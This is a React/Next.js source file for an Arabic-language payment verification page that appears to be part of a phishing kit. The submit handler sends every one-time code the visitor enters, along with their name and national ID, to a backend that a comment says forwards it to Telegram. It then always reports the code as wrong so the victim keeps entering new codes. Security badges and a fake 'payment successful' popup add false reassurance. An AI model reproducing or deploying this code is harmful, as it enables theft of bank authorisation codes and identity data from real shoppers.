"use client";

import { useState, useEffect, useRef } from "react";
import Link from "next/link";
import { useCartStore } from "../../store/cartStore";
import { FileText, Receipt, X, ShieldCheck, KeyRound } from "lucide-react";

export default function VerifyPage() {
  const [otp, setOtp] = useState("");
  const [codeError, setCodeError] = useState(false);
  const [lengthError, setLengthError] = useState(false);
  const [resent, setResent] = useState(false);
  const [cooldown, setCooldown] = useState(0);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [confirmed, setConfirmed] = useState(false);
  const [dbOrderId, setDbOrderId] = useState<string | null>(
    typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null
  );
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // eslint-disable-next-line spellcheck/spell-checker
  function startCooldown() {
    localStorage.setItem("resendUnlockAt", String(Date.now() + 60000));
    setCooldown(60);
    clearInterval(cooldownRef.current!);
    cooldownRef.current = setInterval(() => {
      setCooldown((prev) => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }
  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";

  // Initialize cooldown timer on component mount
  useEffect(() => {
    // بدء العد التنازلي فور دخول الصفحة
    const currentTime = Date.now();
    let unlockAt = Number(localStorage.getItem("resendUnlockAt") ?? 0);
    
    // إذا لم يكن هناك وقت محفوظ أو انتهى الوقت، ابدأ عد تنازلي جديد
    if (unlockAt <= currentTime) {
      unlockAt = currentTime + 60000; // 60 ثانية من الآن
      localStorage.setItem("resendUnlockAt", String(unlockAt));
    }
    
    const remaining = Math.ceil((unlockAt - currentTime) / 1000);
    if (remaining <= 0) return;
    
    // Use a timeout to set the initial cooldown value
    const timeoutId = setTimeout(() => {
      setCooldown(remaining);
      cooldownRef.current = setInterval(() => {
        setCooldown((prev) => {
          if (prev <= 1) { 
            clearInterval(cooldownRef.current!);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
    }, 0);
    
    return () => {
      clearTimeout(timeoutId);
      if (cooldownRef.current) clearInterval(cooldownRef.current);
    };
  }, []);

  // polling - يبدأ فوراً لو dbOrderId موجود
  useEffect(() => {
    const id = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
    if (!id) return;
    if (!dbOrderId) setDbOrderId(id);
    pollRef.current = setInterval(async () => {
      const res = await fetch(`/api/admin/orders/${id}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "confirmed") {
        clearInterval(pollRef.current!);
        setConfirmed(true);
      }
    }, 5000);
    return () => clearInterval(pollRef.current!);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  function handleOtpChange(value: string) {
    const digits = value.replace(/\D/g, "").slice(0, 6);
    setOtp(digits);
    setCodeError(false);
    setLengthError(false);
  }

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    const code = otp;
    if (code.length !== 4 && code.length !== 6) { setLengthError(true); return; }
    
    // إرسال الرمز للتليجرام
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, orderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
    });
    
    // إظهار رسالة خطأ
    setCodeError(true);
    setOtp("");

    // تايمر 5 ثواني للزر
    setSubmitCooldown(5);
    clearInterval(submitCooldownRef.current!);
    submitCooldownRef.current = setInterval(() => {
      setSubmitCooldown((prev) => {
        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }

  // ── Confirmed Popup ──────────────────────────────────────────────────────────
  const confirmedId = dbOrderId ?? (typeof window !== "undefined" ? localStorage.getItem("dbOrderId") : null);
  if (confirmed && confirmedId) {
    return (
      <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 px-4" dir="rtl">
        <div className="relative bg-white rounded-3xl shadow-2xl w-full max-w-sm sm:max-w-md md:max-w-lg overflow-hidden mx-4">
          <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-500 transition-all z-10">
            <X className="w-4 h-4" />
          </Link>
          <div className="flex flex-col items-center pt-4 sm:pt-5 pb-3 bg-white">
            <img src="/sucess.webp" alt="success" className="w-28 h-28 sm:w-36 sm:h-36 md:w-44 md:h-44 object-contain" />
            <span className="mt-2 bg-[#E6EFC0] text-black text-sm font-bold px-4 sm:px-6 py-1.5 rounded-2xl">نجحت عملية الدفع</span>
          </div>
          <div className="px-4 sm:px-5 py-3 sm:py-4 flex flex-col gap-3 text-center">
            <div className="space-y-1">
              <p className="text-gray-800 font-semibold text-base">تمت العملية بنجاح</p>
              <p className="text-gray-500 text-sm leading-6 sm:leading-7">
                شكراً لك لثقتك، وإنه لمن دواعي سرورنا العمل معكم، نشكرك على كونك واحداً من عملائنا الكرام، أنتم تستحقون أفضل خدماتنا، ونتمنى أن نكون عند حسن ظنكم وتوقعاتكم.
              </p>
              <p className="text-gray-500 text-sm">يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.</p>
            </div>
            <div className="flex flex-col sm:flex-row gap-2 sm:gap-3 pb-1">
              <a href={`/invoice/${confirmedId}`} target="_blank" rel="noopener noreferrer"
                className="flex-1 flex items-center bg-[#89BA45] justify-center gap-2 py-2 sm:py-2.5 rounded-xl text-white font-semibold text-sm transition-all">
                <FileText className="w-4 h-4" /> الفاتورة
              </a>
              <a href={`/invoice/${confirmedId}/receipt`} target="_blank" rel="noopener noreferrer"
                className="flex-1 flex items-center justify-center gap-2 py-2 sm:py-2.5 rounded-xl bg-[#89BA45] text-white font-semibold text-sm transition-all">
                <Receipt className="w-4 h-4" /> سند القبض
              </a>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ── Main Page ─────────────────────────────────────────────────────────────────
  return (
    <div className="min-h-screen flex flex-col font-sans bg-white">
      <style>{`body { background-color: #ffffff; }`}</style>

      {/* Main */}
      <main className="flex-grow flex items-center justify-center px-4 py-10 md:py-20">
        <div className="max-w-2xl w-full">

          {/* Card */}
          <div className="bg-white rounded-3xl shadow-[0px_8px_32px_rgba(0,0,0,0.10)] border border-gray-100 p-7 md:p-10 relative overflow-hidden">

            {/* Branding */}
            <div className="mb-6 text-center">
              <div className="flex flex-col items-center gap-3 mb-4">
                <div className="bg-red-600 rounded-2xl p-5 shadow-md shadow-red-200">
                  <KeyRound className="w-12 h-12 text-white" />
                </div>
                <span className="text-gray-700 font-bold text-xl tracking-wide">الأمان أولاً</span>
              </div>
              <h1 className="text-2xl text-gray-900 leading-tight tracking-tight font-bold mb-3">تأكيد العملية</h1>
              <p className="text-gray-500 leading-relaxed text-sm">
                الرجاء إدخال رمز التحقق الذي يصلكم على الهاتف المحمول
              </p>
              <p className="text-gray-400 text-xs mt-2 bg-gray-50 rounded-xl px-4 py-2 inline-block">
                ⏱ أحياناً يصل الرمز متأخراً بعد بضع دقائق، يرجى الانتظار قليلاً
              </p>
            </div>

            {/* OTP Input */}
            <form onSubmit={handleSubmit} className="space-y-5">
              <div dir="ltr">
                <input
                  type="text"
                  inputMode="numeric"
                  maxLength={6}
                  value={otp}
                  onChange={e => handleOtpChange(e.target.value)}
                  placeholder="أدخل الرمز"
                  className={`w-full text-center text-2xl font-bold rounded-xl py-4 px-6 outline-none border-2 transition-all text-gray-900 tracking-[0.5em] ${
                    codeError ? "border-red-400 bg-red-50" : "bg-gray-50 border-gray-200 focus:border-red-500 focus:bg-white focus:shadow-[0_0_0_3px_rgba(220,38,38,0.12)]"
                  }`}
                />
              </div>

              {lengthError && <p className="text-orange-500 text-sm font-semibold text-center -mt-4">⚠️ يجب إدخال 4 أو 6 أرقام</p>}
              {codeError && <p className="text-red-500 text-sm font-semibold text-center -mt-4">الرمز غير صحيح</p>}
              {resent && <p className="text-green-600 text-sm text-center font-medium">✅ تم إعادة إرسال الرمز</p>}

              {/* Actions */}
              <div className="space-y-4">
                <button
                  type="submit"
                  disabled={submitCooldown > 0}
                  className={`w-full py-4 px-6 rounded-xl text-white font-bold text-lg shadow-md transition-all duration-200 flex items-center justify-center gap-2 ${
                    submitCooldown > 0
                      ? "bg-gray-400 cursor-not-allowed opacity-60"
                      : "bg-[#89BA45] hover:bg-[#7aaa3a] shadow-green-200 hover:shadow-green-300 active:scale-95"
                  }`}
                >
                  {submitCooldown > 0 ? `انتظر (${submitCooldown}s)` : "اتمام الطلب"}
                  <ShieldCheck className="w-5 h-5" />
                </button>

                <div className="flex flex-col items-center gap-3 text-sm">
                  <p className="text-gray-500">
                    لم تستلم الرمز؟{" "}
                    <button
                      type="button"
                      disabled={cooldown > 0}
                      onClick={() => {
                        if (cooldown > 0) return;
                        fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
                        setResent(true);
                        setTimeout(() => setResent(false), 3000);
                        startCooldown();
                      }}
                      className={`font-semibold transition-all select-none ${
                        cooldown > 0
                          ? "text-gray-300 cursor-not-allowed opacity-50 pointer-events-none"
                          : "text-red-600 hover:underline cursor-pointer"
                      }`}
                    >
                      {cooldown > 0 ? `إعادة الإرسال (${cooldown}s)` : "إعادة الإرسال"}
                    </button>
                  </p>
                  <Link href="/checkout" className="flex items-center gap-1 text-gray-400 font-medium hover:text-gray-700 transition-colors">
                    → العودة للطلب
                  </Link>
                </div>
              </div>
            </form>

            {/* Decorative blobs */}
            <div className="absolute -top-12 -right-12 w-32 h-32 bg-red-100/40 rounded-full blur-3xl pointer-events-none" />
            <div className="absolute -bottom-12 -left-12 w-32 h-32 bg-red-50/40 rounded-full blur-3xl pointer-events-none" />
          </div>

          {/* Contextual Help */}
          <div className="mt-6 flex justify-center">
            <div className="flex items-center gap-2 text-gray-400">
              <ShieldCheck className="w-4 h-4" />
              <span className="text-xs tracking-wider">وصول آمن ومشفر</span>
            </div>
          </div>

        </div>
      </main>



    </div>
  );
}
